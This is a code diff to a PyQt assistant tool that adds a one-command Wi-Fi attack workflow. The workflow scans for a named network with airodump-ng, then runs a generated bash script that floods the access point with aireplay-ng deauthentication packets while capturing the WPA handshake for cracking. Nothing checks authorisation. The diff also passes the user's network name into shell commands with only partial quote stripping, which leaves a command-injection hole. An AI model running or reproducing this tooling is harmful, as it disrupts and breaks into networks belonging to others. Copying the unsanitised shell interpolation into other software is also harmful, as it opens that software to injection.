@@ -510,7 +510,16 @@ class MaximWindow(QMainWindow):
             self._execute_command(query)
             return
 
-        # 2. Everything else → AI decides what to do
+        # 2. Handshake capture workflow
+        handshake_match = re.search(r'(?:capture|get|grab)\s+(?:the\s+)?handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
+        if not handshake_match:
+            handshake_match = re.search(r'handshake\s+(?:on|from|for|of)\s+(.+)', q_lower)
+        if handshake_match:
+            essid = handshake_match.group(1).strip().strip('"\'')
+            self._capture_handshake(essid)
+            return
+
+        # 3. Everything else → AI decides what to do
         if self.ai and self.ai.is_available():
             self._ai_execute(query)
         else:
@@ -729,6 +738,113 @@ class MaximWindow(QMainWindow):
             f"sudo systemctl restart wpa_supplicant; "
             f"sudo dhclient"
         )
+
+    def _capture_handshake(self, essid):
+        """Full handshake capture workflow: scan → find target → capture → save to MAXIMHASH."""
+        self.terminal.appendPlainText(f"\n{'═'*60}")
+        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
+        self.terminal.appendPlainText(f"{'═'*60}\n")
+
+        # Ensure adapter is selected and in monitor mode
+        if not getattr(self, '_wifi_adapter_selected', False):
+            iface, keep = self._select_wifi_adapter()
+            if iface is None:
+                self.terminal.appendPlainText("[!] WiFi operation cancelled.\n")
+                return
+            self._selected_wifi_iface = iface
+            self._keep_wifi_iface = keep
+            self._wifi_adapter_selected = True
+            mon_name = self._start_monitor_mode(iface, keep)
+            self._monitor_iface_name = mon_name
+
+        mon = getattr(self, '_monitor_iface_name', f"{self._selected_wifi_iface}mon")
+
+        # Create output directory
+        out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
+        os.makedirs(out_dir, exist_ok=True)
+
+        # Step 1: Quick scan to find the ESSID — 15 second scan
+        self.terminal.appendPlainText(f"[1/4] Scanning for '{essid}'... (15 seconds)\n")
+        scan_file = f"/tmp/maxim_scan_{essid.replace(' ', '_')}"
+        code, out, _ = self.runner.run(
+            f"sudo timeout 15 airodump-ng --essid '{essid}' --write-interval 1 -w '{scan_file}' --output-format csv {mon}"
+        )
+
+        # Step 2: Parse CSV to find BSSID and channel
+        bssid = None
+        channel = None
+        csv_file = f"{scan_file}-01.csv"
+        try:
+            with open(csv_file, 'r', errors='replace') as f:
+                for line in f:
+                    if essid.lower() in line.lower():
+                        parts = line.strip().split(',')
+                        if len(parts) >= 14:
+                            candidate_bssid = parts[0].strip()
+                            candidate_channel = parts[3].strip()
+                            # Validate BSSID format
+                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', candidate_bssid):
+                                bssid = candidate_bssid
+                                channel = candidate_channel.strip()
+                                break
+        except Exception:
+            pass
+
+        # Cleanup scan files
+        self.runner.run(f"rm -f {scan_file}-* 2>/dev/null")
+
+        if not bssid or not channel:
+            self.terminal.appendPlainText(f"\n[!] Could not find network '{essid}'.\n")
+            self.terminal.appendPlainText(f"[!] Make sure the network is in range and broadcasting.\n")
+            return
+
+        self.terminal.appendPlainText(f"[2/4] Found: BSSID={bssid}  Channel={channel}\n")
+
+        # Step 3: Capture handshake + deauth in external terminal
+        # Write a script that captures and deauths simultaneously
+        safe_essid = essid.replace(' ', '_').replace("'", "")
+        capture_prefix = f"{out_dir}/{safe_essid}"
+
+        import tempfile
+        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
+        script.write("#!/bin/bash\n")
+        script.write(f"echo ''\n")
+        script.write(f"echo '══════════════════════════════════════════'\n")
+        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
+        script.write(f"echo '  BSSID: {bssid}  Channel: {channel}'\n")
+        script.write(f"echo '  Output: {out_dir}/'\n")
+        script.write(f"echo '══════════════════════════════════════════'\n")
+        script.write(f"echo ''\n")
+        script.write(f"echo '[*] Starting capture on channel {channel}...'\n")
+        script.write(f"echo '[*] Sending deauth packets in background...'\n")
+        script.write(f"echo '[*] Wait for WPA handshake message, then press Ctrl+C'\n")
+        script.write(f"echo ''\n\n")
+        # Start deauth in background (send 5 rounds of 10 deauths, with pauses)
+        script.write(f"(\n")
+        script.write(f"  sleep 5\n")
+        script.write(f"  for i in 1 2 3 4 5; do\n")
+        script.write(f"    sudo aireplay-ng --deauth 10 -a {bssid} {mon} 2>/dev/null\n")
+        script.write(f"    sleep 10\n")
+        script.write(f"  done\n")
+        script.write(f") &\n")
+        script.write(f"DEAUTH_PID=$!\n\n")
+        # Capture — airodump-ng will show "WPA handshake: XX:XX..." when captured
+        script.write(f"sudo airodump-ng -c {channel} --bssid {bssid} -w '{capture_prefix}' {mon}\n\n")
+        # Cleanup deauth process
+        script.write(f"kill $DEAUTH_PID 2>/dev/null\n")
+        script.write(f"echo ''\n")
+        script.write(f"echo '[*] Capture files saved to {out_dir}/'\n")
+        script.write(f"ls -la {capture_prefix}* 2>/dev/null\n")
+        script.write(f"echo ''\necho 'Press Enter to close'\nread\n")
+        script.close()
+        os.chmod(script.name, 0o755)
+
+        self.terminal.appendPlainText(f"[3/4] Opening capture terminal (deauth + airodump-ng)...\n")
+        self.terminal.appendPlainText(f"[*] Wait for 'WPA handshake: {bssid}' then press Ctrl+C\n")
+        self.terminal.appendPlainText(f"[4/4] Capture files → {out_dir}/\n\n")
+
+        # Open in external terminal
+        self.runner.run_in_terminal(f"bash '{script.name}'")
 
     # ═══════════════════════════════════════
     #  COMMAND EXECUTION
